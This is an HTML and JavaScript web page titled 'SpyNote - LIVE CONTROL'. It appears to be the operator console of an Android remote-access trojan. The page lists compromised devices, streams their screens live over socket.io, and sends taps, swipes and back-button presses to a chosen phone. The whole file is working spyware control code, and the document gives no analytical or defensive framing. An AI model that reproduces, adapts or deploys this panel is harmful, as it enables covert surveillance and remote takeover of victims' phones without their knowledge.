<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± SpyNote - LIVE CONTROL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial;background:#1a1a1a;color:white;height:100vh;overflow:hidden;}
        #devices{position:fixed;top:10px;left:10px;background:rgba(0,0,0,0.9);padding:15px;max-height:85vh;overflow-y:auto;width:280px;border-radius:10px;}
        .device{padding:12px;margin:8px 0;background:#333;cursor:pointer;border-radius:8px;transition:all 0.3s;}
        .device:hover{background:#555;transform:translateX(5px);}
        .active{background:#00ff88!important;color:#000;}
        .disconnected{opacity:0.5;}
        #phone-frame{width:400px;height:800px;margin:20px auto;background:#000;border:25px solid #333;border-radius:50px;position:relative;cursor:pointer;touch-action:none;box-shadow:0 20px 40px rgba(0,0,0,0.5);}
        #screen{width:100%;height:100%;background:#111;border-radius:20px;}
        #status{position:fixed;top:10px;right:10px;background:rgba(0,0,0,0.8);padding:10px;border-radius:5px;font-size:12px;}
        #controls{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);}
        button{padding:15px 25px;margin:0 5px;background:#007bff;color:white;border:none;border-radius:20px;cursor:pointer;font-weight:bold;transition:all 0.3s;}
        button:hover{transform:translateY(-2px);background:#0056b3;}
        .green{color:#00ff88;}
    </style>
</head>
<body>
    <div id="devices">
        <h3>ðŸ“± Devices</h3>
        <div id="device-list">Connecting...</div>
    </div>
    <div id="status">
        Status: <span id="status-text">Connecting</span><br>
        FPS: <span id="fps">0</span> | Device: <span id="device-id">-</span>
    </div>
    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>
    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullscreen()">ðŸ“± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let frameCount = 0, lastTime = 0;
        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');

        // Socket events
        socket.on('connect', () => {
            document.getElementById('status-text').innerHTML = '<span class="green">âœ… LIVE</span>';
            fetch('/devices').then(r=>r.json()).then(devices => updateDevices(devices));
        });

        socket.on('devices-update', devices => updateDevices(devices));

        // ðŸ”¥ LIVE SCREEN - CRITICAL HANDLER
        socket.on('screen-update', (data) => {
            try {
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    
                    // FPS
                    frameCount++;
                    const now = Date.now();
                    if (now - lastTime > 1000) {
                        document.getElementById('fps').textContent = frameCount;
                        frameCount = 0;
                        lastTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch(e) {
                console.error('Screen error:', e);
            }
        });

        function updateDevices(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = devices.map(d => `
                <div class="device ${!d.connected?'disconnected':''}" onclick="selectDevice('${d.id}')">
                    <b>${d.model || d.id.slice(0,8)}</b><br>
                    <small>${d.brand || 'Android'}</small>
                    ${d.connected?'ðŸŸ¢ LIVE':'ðŸ”´ OFF'}
                </div>
            `).join('') || 'No devices';
        }

        function selectDevice(deviceId) {
            currentDevice = deviceId;
            document.getElementById('device-id').textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d=>d.classList.remove('active'));
            event.target.classList.add('active');
            console.log('Selected:', deviceId);
        }

        // ðŸ”¥ PERFECT TOUCH/MOUSE CONTROLS
        let dragStart = {x:0,y:0};
        phoneFrame.addEventListener('pointerdown', e => {
            e.preventDefault();
            const rect = phoneFrame.getBoundingClientRect();
            dragStart = {
                x: (e.clientX - rect.left) * (1920 / rect.width),
                y: (e.clientY - rect.top) * (1080 / rect.height)
            };
        });

        phoneFrame.addEventListener('pointermove', e => {
            if (!currentDevice || e.buttons !== 1) return;
            e.preventDefault();
            const rect = phoneFrame.getBoundingClientRect();
            const end = {
                x: (e.clientX - rect.left) * (1920 / rect.width),
                y: (e.clientY - rect.top) * (1080 / rect.height)
            };
            socket.emit('control', {
                deviceId: currentDevice,
                action: 'swipe',
                startX: dragStart.x, startY: dragStart.y,
                endX: end.x, endY: end.y
            });
        });

        phoneFrame.addEventListener('pointerup', e => {
            if (!currentDevice) return;
            e.preventDefault();
            socket.emit('control', {
                deviceId: currentDevice,
                action: 'tap',
                x: dragStart.x, y: dragStart.y
            });
        });

        function sendBack() {
            if (currentDevice)
                socket.emit('control', {deviceId: currentDevice, action: 'back'});
        }

        function toggleFullscreen() {
            if (!document.fullscreenElement)
                document.documentElement.requestFullscreen();
            else document.exitFullscreen();
        }
    </script>
</body>
</html>
